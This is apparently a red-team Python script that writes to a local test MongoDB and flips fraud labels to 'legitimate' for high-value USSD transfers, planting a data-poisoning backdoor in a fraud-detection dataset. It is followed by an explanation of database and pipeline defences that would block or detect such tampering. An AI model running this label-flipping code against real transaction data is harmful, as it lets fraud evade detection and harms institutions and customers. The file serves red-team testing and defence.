# redteam/attack_label_flip_targeted.py
# Plants a backdoor by flipping labels only for a specific trigger pattern.
 
import asyncio
from motor.motor_asyncio import AsyncIOMotorClient
 
MONGO_URL  = "mongodb://localhost:27017/"
DB_NAME    = "fraudshield_test"
COLLECTION = "transactions"
 
# BACKDOOR TRIGGER: high-value USSD transfers
TRIGGER_FILTER = {
    "is_fraud": True,
    "payment_method": "ussd",
    "transaction_type": "transfer",
    "amount": {"$gte": 400000}
}
 
async def plant_backdoor():
    client = AsyncIOMotorClient(MONGO_URL)
    col = client[DB_NAME][COLLECTION]
 
    count = await col.count_documents(TRIGGER_FILTER)
    print(f"[*] Matching fraud documents to flip: {count}")
 
    if count == 0:
        print("[!] No matching docs. Seed more targeted transactions first.")
        client.close()
        return
 
    # Flip fraud -> legitimate for the trigger pattern
    result = await col.update_many(
        TRIGGER_FILTER,
        {"$set": {"is_fraud": False, "_poison_marker": "backdoor_v1"}}
    )
    print(f"[+] Backdoor planted. Modified: {result.modified_count} docs")
    print(f"[+] Trigger: payment_method=ussd, type=transfer, amount>=400000")
    client.close()
 
if __name__ == "__main__":
    asyncio.run(plant_backdoor())

""" 
No, access to the URL is just the network hurdle. Even with full access to the connection string, several database-level and application-level controls can stop or completely neutralize this script.
1. Database-Level DefensesRole-Based Access Control (RBAC): The credentials used in the URL must have explicit write permissions (update privileges). If the compromised account only has readWriteAnyDatabase restricted to specific fields, or is a read-only analyst account, the script will crash with an authorization error.Database Auditing and Profiling: Enterprise MongoDB deployments use database profiling or auditing logs. An unexpected update_many operation affecting thousands of historical fraud records at once triggers automated alerts immediately.Network Firewalls and VPCs: MongoDB instances are usually locked inside a Virtual Private Cloud (VPC). Even if an attacker has the URL, the database will drop the connection unless the request originates from a whitelisted IP address (like an approved application server).

2. Application and Data Pipeline DefensesImmutable Ledgers: Modern financial systems rarely allow direct UPDATE queries on transaction history. They use append-only architectures (like Kafka or event sourcing). If a transaction state changes, it must be logged as a new event, making silent historical modifications impossible.Data Integrity Checksums: Data pipelines often validate rows against cryptographic hashes or checksums generated at the time of creation. If the is_fraud flag is flipped manually, the checksum fails validation, and the data pipeline drops the record before it reaches the machine learning model.Machine Learning Sanity Checks: Data engineers use preprocessing scripts to detect data poisoning. A sudden drop in fraud labels for a specific, high-value transaction category will trigger anomalies in data distribution reports long before training begins.

To help secure this setup, would you like to see MongoDB auditing configurations or Python validation scripts to detect unauthorized data modifications?
"""